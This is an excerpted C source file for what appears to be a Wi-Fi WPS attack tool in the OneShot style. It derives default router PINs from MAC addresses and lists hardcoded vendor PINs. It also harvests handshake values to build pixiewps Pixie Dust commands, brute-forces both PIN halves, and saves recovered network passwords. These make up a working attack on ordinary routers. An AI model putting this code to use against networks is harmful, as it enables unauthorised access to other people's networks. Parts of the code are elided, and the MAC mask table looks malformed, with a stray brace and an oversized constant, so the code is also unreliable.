...
const char *mac2str(mac_t mac) {
  ...
  sprintf(str, "%02X:%02X:%02X:%02X:%02X:%02X", b[5], b[4], b[3], b[2], b[1],
          b[0]);
  return str;
}
...
pin_t pin24(mac_t mac) { return mac & 0xFFFFFF; }
pin_t pin28(mac_t mac) { return mac & 0xFFFFFFF; }
pin_t pin32(mac_t mac) { return mac % 0x100000000; }
...
pin_t pinAirocon(mac_t mac) {
  ...
  for (byte = 0; byte < 6; byte++)
    b[byte] = mac_byte(mac, byte);
  pin_t pin = (((b[0] + b[1]) % 10) * 1) + (((b[5] + b[0]) % 10) * 10) +
...
const algo_t algorithms[] = {
    {"Empty", EMPTY_PIN, NULL},       {"24-bit PIN", NO_PIN, pin24},
    {"28-bit PIN", NO_PIN, pin28},    {"32-bit PIN", NO_PIN, pin32},
    {"D-Link PIN", NO_PIN, pinDLink}, {"D-Link PIN +1", NO_PIN, pinDLink1},
    {"ASUS PIN", NO_PIN, pinASUS},    {"Airocon Realtek", NO_PIN, pinAirocon},

    {"Cisco", 1234567, NULL},         {"Broadcom 1", 2017252, NULL},
    {"Broadcom 2", 4626484, NULL},    {"Broadcom 3", 7622990, NULL},
    {"Broadcom 4", 6232714, NULL},    {"Broadcom 5", 1086411, NULL},
    {"Broadcom 6", 3195719, NULL},    {"Aircocon 1", 3043203, NULL},
    {"Aircocon 2", 7141225, NULL},    {"DSL-2740R", 6817554, NULL},
    {"Realtek 1", 9566146, NULL},     {"Realtek 2", 9571911, NULL},
    {"Realtek 3", 4856371, NULL},     {"Upvel", 2085483, NULL},
    {"UR-814AC", 4397768, NULL},      {"UR-825AC", 529417, NULL},
    {"Onlime", 9995604, NULL},        {"Edimax", 3561153, NULL},
    {"Thomson", 6795814, NULL},       {"HG532x", 3425928, NULL},
    {"H108L", 9422988, NULL},         {"CBN ONO", 9575521, NULL},
};
...
unsigned long long int suggest(mac_t mac) {
  const mac_t masks[][256] = {
      {0xFFE46F13, 0xFFEC2280, 0xFF58D56E, 0xFF1062EB, 0xFF10BEF5, 0xFF1C5F2B,
       0xFF802689, 0xFFA0AB1B, 0xFF74DADA, 0xFF9CD643, 0xFF68A0F6, 0xFF0C96BF,
       0xFF20F3A3, 0xFFACE215, 0xFFC8D15E, 0xFF000E8F, 0xFFD42122, 0xFF3C9872,
       0xFF788102, 0xFF7894B4, 0xFFD460E3, 0xFFE06066, 0xFF004A77, 0xFF2C957F,
       0xFF64136C, 0xFF74A78E, 0xFF88D274, 0xFF702E22, 0xFF74B57E, 0xFF789682,
       0xFF7C3953, 0xFF8C68C8, 0xFFD476EA, 0xFF344DEA, 0xFF38D82F, 0xFF54BE53,
       0xFF709F2D, 0xFF94A7B7, 0xFF981333, 0xFFCAA366, 0xFFD0608C, 0x0},
       0xFFD07AB5, 0xFFCCA223, 0xFFE8CD2D, 0xFFF80113, 0xFFF83DFF, 0x0},
      {0xFF4C09B4, 0xFF4CAC0A, 0xFF84742A4, 0xFF9CD24B, 0xFFB075D5, 0xFFC864C7,
       0xFFDC028E, 0xFFFCC897, 0x0},
...
int got_all_pixieps_data(const pixiewps_data_t *data) {
  return *data->pke != '\0' && *data->pkr != '\0' && *data->authkey != '\0' &&
         *data->e_hash1 != '\0' && *data->e_hash2 != '\0' &&
         *data->e_nonce != '\0';
}
void get_pixiewps_cmd(const pixiewps_data_t *data, int full_range, char *buf) {
  sprintf(buf,
          "pixiewps --pke %s --pkr %s --e-hash1 %s"
          " --e-hash2 %s --authkey %s --e-nonce %s %s",
          data->pke, data->pkr, data->e_hash1, data->e_hash2, data->authkey,
          data->e_nonce, full_range ? "--force" : "");
}
enum {
  STATUS_NO,
  STATUS_WSC_NACK,
...
int wpa_ctrl_open(wpa_ctrl_t *ctrl, const char *ctrl_path) {
  ...
  sprintf(ctrl->local.sun_path, P_tmpdir "/wpa_ctrl_%d_%d", getpid(),
          counter++);
...
int wpa_ctrl_send_recv(wpa_ctrl_t *ctrl, const char *input, char *output,
                       size_t len) {
...
FILE *run_wpa_supplicant(wpa_ctrl_t *ctrl, const char *interface) {
  ...
  char wpas_cmd[256];
  sprintf(wpas_cmd,
          "wpa_supplicant -K -d -Dnl80211,wext,hostapd,wired -i%s -c%s",
...
void init(data_t *data, const char *interface, int save_result,
          int print_debug) {
  const char *oneshot_dir = get_oneshot_dir();
  mkdir(oneshot_dir, 0777);
...
void save_result(data_t *data, mac_t bssid, const char *essid, pin_t pin,
                 const char *psk) {
...
pin_t prompt_wpspin(mac_t bssid) {
  ...
  for (type = 0; type < PIN_TYPES_COUNT; type++)
    if ((bytes >> type) & 1)
      results[pin_count++] =
          (struct result_t){generate_pin(type, bssid), algorithms[type].name};
  if (pin_count > 1) {
...
int handle_wpas(data_t *data, int pixiemode, mac_t bssid) {
      ...
      if (sscanf(line, "WPS: Enrollee Nonce - hexdump(len=16): %[^\n]s",
        ...
        if (pixiemode)
          printf("[P] E-Nonce: %s\n", pixie->e_nonce);
                        ...
                        "WPS: DH own Public Key - hexdump(len=192): %[^\n]s",
                        pixie->pkr) == 1) {
        remove_spaces(pixie->pkr);
        if (pixiemode)
          printf("[P] PKR: %s\n", pixie->pkr);
      } else if (sscanf(line,
                        "WPS: DH peer Public Key - hexdump(len=192): %[^\n]s",
                        pixie->pke) == 1) {
  ...
  } else if (strstr(line, "Associated with") && strstr(line, data->interface)) {
    if (*status->essid != '\0')
...
void single_connection(data_t *data, mac_t bssid, pin_t pin, int pixiemode,
  ...
  if (data->connection_status.status == STATUS_GOT_PSK) {
    ...
    if (data->save_result)
      save_result(data, bssid, data->connection_status.essid, pin,
    ...
    if (got_all_pixieps_data(&data->pixiewps_data)) {
      ...
      if (pin != NO_PIN)
        return single_connection(data, bssid, pin, 0, showpixiesmd, pixieforce);
...
pin_t first_half_bruteforce(data_t *data, mac_t bssid, pin_t f_half,
                            int delay) {
  while (f_half < 10000) {
...
pin_t second_half_bruteforce(data_t *data, mac_t bssid, pin_t f_half,
                             pin_t s_half, int delay) {
  while (s_half < 1000) {
    ...
    if (last && *str == '"') {
      ...
      *str = '\0';
      ...
      case 0: {
        int month;
        struct tm time;
        sscanf(last, "%2d.%2d.%4d %2d:%2d", &time.tm_year, &month,
...
network_entry_t *read_csv(const char *path, size_t *count) {
  ...
  network_entry_t *networks =
      (network_entry_t *)malloc(sizeof(network_entry_t) * (lines - 1));
  unsigned int l;
  for (l = 0; l < lines; l++) {
    char str[1024];
    fgets(str, 1024, file);
...
int compare_network_info(const void *n1, const void *n2) {
  return ((const network_info_t *)n2)->signal -
         ((const network_info_t *)n1)->signal;
}
mac_t scan_wifi(const char *interface, char **vuln_list, int reverse_scan) {
  ...
  if (network_count) {
    ...
    printf("%-4s %-18s %-25s %-8s %-4s %-27s %s\n", "#", "BSSID", "ESSID",
           "Sec.", "PWR", "WSC device name", "WSC model");
    ...
    while (i != (reverse_scan ? -1 : network_count)) {
      ...
      printf("%-4s %-18s %-25s %-8s %-4d %-27s %s %s\n", number,
             mac2str(network->bssid), network->essid, security, network->signal,
    ...
    while (1) {
      ...
      else if (sscanf(input, "%d", &number) != 1 || number < 1 ||
               number > network_count)
        fprintf(stderr, "Invalid number\n");
      else
...
enum { MODE_DOWN, MODE_UP };
int interface_set(const char *interface, int up) {
  char str[128];
  snprintf(str, 128, "ip link set %s %s", interface, (up ? "up" : "down"));
  return system(str);
}
void print_help() {
  printf(
      ...
      "    -p, --pin=<wps pin>      : Use the specified pin (arbitrary string "
      "or 4/8 digit pin)\n"
      ...
      "    -w, --write              : Write AP credentials to the file on "
      "success\n"
      "    -F, --pixie-force        : Run Pixiewps with --force option "
      "(bruteforce full range)\n"
      "    -X, --show-pixie-cmd     : Always print Pixiewps command\n"
      "    --vuln-list=<filename>   : Use custom file with vulnerable devices "
      "list ['vulnwsc.txt']\n"
      "    --iface-down             : Down network interface when the work is "
      "finished\n"
      "    -l, --loop               : Run in a loop\n"
      "    -v, --verbose            : Verbose output\n"
      "    -m, --mtk-fix            : MTK interface fix, turn off Wi-Fi to use "
      "this\n"
      "    -r, --reverse-scan       : Reverse sorting of networks in the scan. "
...
int main(int argc, char **argv) {
  ...
  enum { OPT_IFACE_DOWN = CHAR_MAX + 1, OPT_VULN_LIST };
  ...
  do {
    if (input.bssid == NO_MAC) {
      if (!input.loop)
        printf("[*] BSSID not specified (--bssid) — scanning for available "
               "networks\n");
